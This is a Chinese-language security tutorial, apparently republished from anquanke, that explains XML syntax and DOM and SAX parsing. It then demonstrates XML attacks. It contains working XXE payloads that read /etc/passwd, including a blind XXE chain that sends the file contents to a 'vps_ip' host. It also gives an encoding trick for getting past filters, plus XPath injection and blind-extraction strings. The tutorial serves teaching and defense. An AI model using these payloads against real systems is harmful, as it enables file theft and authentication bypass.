> 原文链接: https://www.anquanke.com//post/id/155328 


# 由浅入深剖析xml及其安全隐患


                                阅读量   
                                **296868**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t013759a3c369a91c39.jpg)](https://p3.ssl.qhimg.com/t013759a3c369a91c39.jpg)

## 前言

本文用来归纳并深入理解xml语言及其在web环境中可能存在的安全隐患。



## xml基本概念

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFxml%EF%BC%9F"></a>什么是xml？

XML 指可扩展标记语言（EXtensible Markup Language），是一种标记语言，很类似 HTML。其设计宗旨是传输数据，而非显示数据。<br>
XML 标签没有被预定义。所以需要自行定义标签。

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80%EF%BC%9F"></a>什么是标记语言？

标记语言，是一种将文本以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记进行标识。<br>
标记语言不仅仅是一种语言，就像许多语言一样，它需要一个运行时环境，使其有用。提供运行时环境的元素称为用户代理。

### <a class="reference-link" name="%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80%E7%9A%84%E4%B8%8D%E5%90%8C%E7%82%B9"></a>标记语言的不同点
- 1.标记语言
被读取的，本身没有行为能力（被动）；例如：Html 、XML等
- 2.编程语言
需要编译执行；本身具有逻辑性和行为能力例如：C、Java等
- 3.脚本语言
需要解释执行；本身具有逻辑性和行为能力；例如：javascript等

### <a class="reference-link" name="%E5%BD%92%E7%BA%B3"></a>归纳

所以说xml本身是一种语言，所以它具有本身语言的特性，和需要完成的功能<br>
下面我们看看xml如何发挥自身语言的作用，实现功能



## xml基础语法

### <a class="reference-link" name="xml%E5%A3%B0%E6%98%8E"></a>xml声明

xml文档是由一组使用唯一名称标识的实体组成的。始终以一个声明开始，这个声明指定该文档遵循XML1.0的规范。

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
```

encodeing是指使用的字符编码格式有UTF-8,GBK,gb2312等等<br>
（这里插一嘴，既然可以设置编码格式，就有可能存在bypass，后续讲）

### <a class="reference-link" name="%E6%A0%B9%E5%85%83%E7%B4%A0"></a>根元素

每个XML文件都必须有且只能有一个根元素。用于描述文档功能。可以自定义根元素。下例中的root为根元素。

```
&lt;root&gt;...................&lt;/root&gt;
```

### <a class="reference-link" name="XML%E4%BB%A3%E7%A0%81"></a>XML代码

根据应用需要创建自定义的元素和属性。标签包括尖括号以及尖括号中的文本。元素是XML内容的基本单元。元素包括了开始标签、结束标签和标签之间的内容。

```
&lt;title&gt;XML是可扩展标记语言&lt;/title&gt;
```

### <a class="reference-link" name="%E5%A4%84%E7%90%86%E6%8C%87%E4%BB%A4"></a>处理指令

凡是以`&lt;?`开始，`?&gt;`结束的都是处理指令。XML声明就是一个处理指令。<br>
字符数据分以下两类：<br>
PCDATA（是指将要通过解析器进行解析的文本）<br>
CDATA （是指不要通过解析器进行解析的文本）<br>
其中不允许`CDATA`块之内使用字符串`]]&gt;`,因为它表示CDATA块的结束。

### <a class="reference-link" name="%E5%AE%9E%E4%BD%93"></a>实体

实体分为两类：
- 一般实体(格式：&amp;实体引用名;)
<li>参数实体(格式：%实体引用名;)<br>
一般实体，可以在XML文档中的任何位置出现的实体称为一般实体。实体可以声明为内部实体还是外部实体。<br>
外部实体分SYSYTEM及PUBLIC两种：<br>
SYSYTEM引用本地计算机，PUBLIC引用公共计算机，外部实体格式如下：</li>


```
&lt;!ENTITY 引用名 SYSTEM(PUBLIC) "URI地址"&gt;
```

DOCTYPE声明<br>
在XML文档中，`&lt;!DOCTYPE[...]&gt;`声明跟在XML声明的后面。实体也必须在DOCTYPE声明中声明。<br>
例如

```
&lt;?xml version="1.0" unicode="UTF-8"&gt;
&lt;!DOCTYPE[
.....在此声明实体&lt;!ENTITY 实体引用名 "引用内容"&gt;
]&gt;

```

完整的例子

```
&lt;?xml version="1.0" encoding="GBK"?&gt;
&lt;!DOCTYPE root[
&lt;!ENTITY sky1 "引用字符1"&gt;
&lt;!ENTITY sky2 "引用字符2"&gt;
]&gt;
&lt;root&gt;
&lt;title value="&amp;sky1;"&gt; &amp;sky2; &lt;/title&gt;
&lt;title2&gt;
&lt;value&gt;&lt;a&gt;&amp;sky2;&lt;/a&gt;&lt;/value&gt;
&lt;/title2&gt;
&lt;/root&gt;
```



## xml解析方式

首先xml是被读取的标记语言，他不可能自我解析，所以需要脚本语言或者编译语言对其进行读取然后解析。<br>
这里以Java中主要的两种解析读取方法为例（解析上来说大多大同小异，以java为代表）<br>
xml解析的方式分为两种：
- DOM方式
- SAX方式
### <a class="reference-link" name="DOM%E6%96%B9%E5%BC%8F"></a>DOM方式

DOM方式即以树型结构访问XML文档：<br>
一棵DOM树包含全部元素节点和文本节点。可以前后遍历树中的每一个节点。<br>
例如

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;DataSource&gt;
    &lt;database name="mysql" version="5.0"&gt;
        &lt;driver&gt;com.mysql.jdbc.Driver&lt;/driver&gt;
        &lt;url&gt;jdbc:mysql://localhost:3306/linkinjdbc&lt;/url&gt;
        &lt;user&gt;root&lt;/user&gt;
        &lt;password&gt;root&lt;/password&gt;
    &lt;/database&gt;

    &lt;database name="Oracle" version="10G"&gt;
        &lt;driver&gt;oracle.jdbc.driver.OracleDriver&lt;/driver&gt;
        &lt;url&gt;jdbc:oracle:thin:@127.0.0.1:linkinOracle&lt;/url&gt;
        &lt;user&gt;system&lt;/user&gt;
        &lt;password&gt;root&lt;/password&gt;
    &lt;/database&gt;
&lt;/DataSource&gt;
```

解析后大概如下<br>[![](https://p1.ssl.qhimg.com/t0198d8de91fff0ebcf.png)](https://p1.ssl.qhimg.com/t0198d8de91fff0ebcf.png)<br>
然后再对树操作，进行查找

### <a class="reference-link" name="SAX%E6%96%B9%E5%BC%8F"></a>SAX方式

SAX处理的特点是基于事件流的。分析能够立即开始，而不是等待所有的数据被处理。而且，由于应用程序只是在读取数据时检查数据，因此不需要将数据存储在内存中。这对于大型文档来说是个巨大的优点。<br>
事实上，应用程序甚至不必解析整个文档；它可以在某个条件得到满足时停止解析。sax分析器在对xml文档进行分析时,触发一系列的事件,应用程序通过事件处理函数实现对xml文档的访问。<br>
因为事件触发是有时序性的,所以sax分析器提供的是一种对xml文档的顺序访问机制,对于已经分析过的部分,不能再重新倒回去处理。<br>
此外，它也不能同时访问处理2个tag，sax分析器在实现时,只是顺序地检查xml文档中的字节流,判断当前字节是xml语法中的哪一部分,检查是否符合xml语法并且触发相应的事件。对于事件处理函数的本身,要由应用程序自己来实现。<br>
SAX解析器采用了基于事件的模型，它在解析XML文档的时候可以触发一系列的事件，当发现给定的tag的时候，它可以激活一个回调方法，告诉该方法制定的标签已经找到。<br>
所以对于上述xml内容

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;DataSource&gt;
    &lt;database name="mysql" version="5.0"&gt;
        &lt;driver&gt;com.mysql.jdbc.Driver&lt;/driver&gt;
        &lt;url&gt;jdbc:mysql://localhost:3306/linkinjdbc&lt;/url&gt;
        &lt;user&gt;root&lt;/user&gt;
        &lt;password&gt;root&lt;/password&gt;
    &lt;/database&gt;

    &lt;database name="Oracle" version="10G"&gt;
        &lt;driver&gt;oracle.jdbc.driver.OracleDriver&lt;/driver&gt;
        &lt;url&gt;jdbc:oracle:thin:@127.0.0.1:linkinOracle&lt;/url&gt;
        &lt;user&gt;system&lt;/user&gt;
        &lt;password&gt;root&lt;/password&gt;
    &lt;/database&gt;
&lt;/DataSource&gt;
```

它的解析流程为：

```
开始解祈XML文档...

开始解祈元素[DataSource]...
共有[0]个属性...
开始接受元素中的字符串数据...

开始解祈元素[database]...
共有[2]个属性...
属性名是：name;属性值是:mysql
属性名是：version;属性值是:5
开始接受元素中的字符串数据...

开始解祈元素[driver]...
共有[0]个属性...
开始接受元素中的字符串数据...
com.mysql.jdbc.Driver
解祈元素[driver]结束...

开始解祈元素[url]...
共有[0]个属性...
开始接受元素中的字符串数据...
jdbc:mysql://localhost:3306/linkinjdbc
解祈元素[url]结束...

.......
解祈元素[database]结束...

开始解祈元素[database]...
共有[2]个属性...
属性名是：name;属性值是:Oracle
属性名是：version;属性值是:10G
开始接受元素中的字符串数据...


.....
解祈元素[database]结束...
解祈元素[DataSource]结束...
```

大概如上，这样即可顺序访问，知道找到需要访问的值，即可回调返回结束

### <a class="reference-link" name="%E4%BC%98%E7%BC%BA%E7%82%B9%E5%AF%B9%E6%AF%94"></a>优缺点对比

DOM形:
<li>优点：
<ul>
- 整个 Dom 树都加载到内存中了，所以允许随机读取访问数
- 允许随机的对文档结构进行增删- 整个 XML 文档必须一次性解析完，耗时。
- 整个 Dom 树都要加载到内存中，占内存。- 访问能够立即进行，不需要等待所有数据被加载
- 不需要将整个数据都加载到内存中，占用内存少
- 允许注册多个Handler,可以用来解析文档内容，DTD约束等等- 需要应用程序自己负责TAG的处理逻辑（例如维护父/子关系等），文档越复杂程序就越复杂。
- 单向导航，无法定位文档层次，很难同时访问同一文档的不同部分数据，不支持XPath。
- 不能随机访问 xml 文档，不支持原地修改xml。


## 安全隐患

xml作为数据存储/传递的一种标记语言，一定是会在通讯，交互等时候被使用的，那么编译语言/脚本语言需要读取xml来读取数据的时候，势必会解析xml格式的文本内容<br>
那么在解析的时候，如果攻击者可以控制xml格式的文本内容，那么就可以让编译语言/脚本语言接收到恶意构造的参数，若不加过滤，则会引起安全隐患

### <a class="reference-link" name="XXE-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"></a>XXE-任意文件读取

在上述的语法中，我们提及到，xml可以引入实体，例如

```
&lt;!ENTITY 引用名 SYSTEM(PUBLIC) "URI地址"&gt;
```

我们可以看到，这里填写的是url地址，这就可以涉及到多个问题：<br>
1.url协议多样，例如：file、http、gopher……<br>
2.是否可以请问外部实体<br>
这里我们先做一个简单的测试，使用file协议，引入实体<br>
php代码如下

```
&lt;?php
$xml= file_get_contents("./xxepayload.txt");
$data = simplexml_load_string($xml,'SimpleXMLElement',$options=LIBXML_NOENT);
print_r($data);
?&gt;
```

xml内容如下:

```
&lt;?xml version = "1.0"?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;/x&gt;
```

访问后可得到回显<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0173f714a823a01762.png)这是为什么？<br>
因为

```
&lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;
```

此处将本地计算机中`file:///etc/passwd`文件的内容取出，赋值给了实体`f`<br>
然后实体`f`的值作为元素`x`中的字符串数据被php解析的时候取出，作为对象里的内容<br>
然后再输出该对象的时候被打印出来。<br>
故此，倘若我们可以控制xml文本内容，那么就能利用编译/脚本语言的解析，输出我们想读的指定文件

### <a class="reference-link" name="XXE-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E7%9B%B2%E8%AF%BB%E5%8F%96"></a>XXE-任意文件盲读取

我们知道在Xml解析内容可以被输出的时候，我们可以采取上述攻击方式<br>
但有时候，xml只作为数据的传递方式，服务端解析xml后，直接将数据进一步处理再输出，甚至不输出，这时候可能就无法得到我们想读的结果。<br>
那么此时，可以尝试使用blind xxe进行攻击：<br>
1.我们可以利用file协议去读取本地文件<br>
2.我们可以利用http协议让实体被带出<br>
我们知道xml中，跟的是url地址

```
&lt;!ENTITY 引用名 SYSTEM(PUBLIC) "URI地址"&gt;
```

那么此时我们当然可以使用http协议，那么xml解析的时候势必会去访问我们指定的url链接<br>
此时就有可能将数据带出<br>
我们想要的方法是这样的

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % param1 "file:///etc/passwd"&gt;
&lt;!ENTITY % param2 "http://vps_ip/?%param1"&gt;
%param2;
]&gt;
```

此时xml解析时，就会将我们读取到的内容的param1实体带出，我们再vps的apache log上就可以看到<br>
但是上述构造存在语法问题<br>
于是我们想到这样一个构造方案<br>
post.xml

```
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE ANY[
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % remote SYSTEM "http://vps_ip/evil.xml"&gt;
%remote;
%all;
]&gt;
&lt;root&gt;&amp;send;&lt;/root&gt;
```

evil.xml

```
&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://vps_ip/1.php?file=%file;'&gt;"&gt;
```

这样一来，在解析xml的时候：<br>
1.file实体被赋予`file:///etc/passwd`的内容<br>
2.解析remote值的时候，访问`http://vps_ip/evil.xml`<br>
3.在解析`evil.xml`中all实体的时候，将file实体带入<br>
4.访问指定url链接，将数据带出<br>
于是成功造成了blind xxe文件读取

这里再额外提及一下，既然我们再开始申明的时候可以规定编码格式，那么倘若后台对

```
ENTITY
```

等关键词进行过滤时，我们可以尝试使用UTF-7，UTF-16等编码去Bypass<br>
例如

```
&lt;?xml version="1.0" encoding="UTF-16"?&gt;
```

### <a class="reference-link" name="Xpath%E6%B3%A8%E5%85%A5"></a>Xpath注入

xml同样可作为数据存储，所以这里可以将其当做数据库<br>
类似于如下

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt; 
&lt;users&gt; 

&lt;user&gt; 
&lt;firstname&gt;Ben&lt;/firstname&gt;
&lt;lastname&gt;Elmore&lt;/lastname&gt; 
&lt;loginID&gt;abc&lt;/loginID&gt; 
&lt;password&gt;test123&lt;/password&gt; 
&lt;/user&gt; 

&lt;user&gt; 
&lt;firstname&gt;Shlomy&lt;/firstname&gt;
&lt;lastname&gt;Gantz&lt;/lastname&gt;
&lt;loginID&gt;xyz&lt;/loginID&gt; 
&lt;password&gt;123test&lt;/password&gt; 
&lt;/user&gt; 

&lt;user&gt; 
&lt;firstname&gt;Jeghis&lt;/firstname&gt;
&lt;lastname&gt;Katz&lt;/lastname&gt;
&lt;loginID&gt;mrj&lt;/loginID&gt; 
&lt;password&gt;jk2468&lt;/password&gt; 
&lt;/user&gt; 

&lt;user&gt; 
&lt;firstname&gt;Darien&lt;/firstname&gt;
&lt;lastname&gt;Heap&lt;/lastname&gt;
&lt;loginID&gt;drano&lt;/loginID&gt; 
&lt;password&gt;2mne8s&lt;/password&gt; 
&lt;/user&gt; 

&lt;/users&gt;
```

其查询语句，也类似于sql语句

```
//users/user[loginID/text()=’abc’ and password/text()=’test123’]
```

所以相同的，我们可以用类似sql注入的方式来闭合引号例如：

```
loginID=' or 1=1 or ''='
password=' or 1=1 or ''='
```

可以得到

```
//users/user[loginID/text()='' or 1=1 or ''='' and password/text()='' or 1=1 or ''='']
```

那么查询语句将返回 true

### <a class="reference-link" name="Xpath%E7%9B%B2%E6%B3%A8"></a>Xpath盲注

方法类似于Sql注入，只是函数可能使用不同<br>
提取当前节点的父节点的名称：

```
' or substring(loginID(parent::*[position()=1]),1,1)='a
' or substring(loginID(parent::*[position()=1]),1,1)='b
' or substring(loginID(parent::*[position()=1]),1,1)='c
....
' or substring(loginID(parent::*[position()=1]),2,1)='a
' or substring(loginID(parent::*[position()=1]),2,1)='b
....
```

如此循环可得到一个完整的父节点名称<br>
确定address节点的名称后，攻击者就可以轮流攻击它的每个子节点，提取出它们的名称与值。（通过索引）

```
'or substring(//user[1]/*[2]/text(),1,1)='a' or 'a'='a
'or substring(//user[1]/*[2]/text(),1,1)='b' or 'a'='a
'or substring(//user[1]/*[2]/text(),1,1)='c' or 'a'='a
.....
```

同时，既然将xml用作数据库，有可能存在泄漏问题,例如

```
accounts.xml
databases.xml
...
```

这里还有一道实例题，有兴趣的可以参考一下

```
http://skysec.top/2018/07/30/ISITDTU-CTF-Web/#Access-Box
```

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"></a>代码注入

这一块可以参考我之前写过的soap总结

```
http://skysec.top/2018/07/25/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/
```

既然xml作为标记语言，需要后台解析<br>
那么我们在传递参数的时候，就可以插入标记语言<br>
（就像html可以被插入，导致xss一样）<br>
在后端解析的时候，就可以达到伪造的目的



## 参考链接

[https://blog.csdn.net/u011794238/article/details/42173795](https://blog.csdn.net/u011794238/article/details/42173795)<br>[http://blog.51cto.com/12942149/1929669](http://blog.51cto.com/12942149/1929669)<br>[https://blog.csdn.net/Holmofy/article/details/78130039](https://blog.csdn.net/Holmofy/article/details/78130039)<br>[https://blog.csdn.net/u011721501/article/details/43775691](https://blog.csdn.net/u011721501/article/details/43775691)
